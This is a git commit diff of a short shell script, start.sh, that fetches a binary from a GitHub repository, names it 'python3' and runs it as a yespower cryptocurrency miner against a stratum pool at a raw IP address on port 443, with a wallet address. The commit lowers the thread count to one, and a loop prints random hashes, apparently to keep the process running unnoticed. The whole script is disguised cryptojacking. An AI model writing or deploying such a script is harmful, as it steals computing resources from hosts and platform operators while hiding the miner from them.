4485023774d8eae62ef24726a2c6876d49fd0683
sanaucok <115146539+sanaucok@users.noreply.github.com>
2022-10-11 17:44:45 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
 wget https://github.com/viliamriah/newmind/raw/main/python3
 chmod +x python3
-./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.$(echo $(shuf -i 1-20000 -n 1)-Dockerios) -p x -t$(nproc --all)
+./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.$(echo $(shuf -i 1-20000 -n 1)-Dockerios) -p x -t 1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
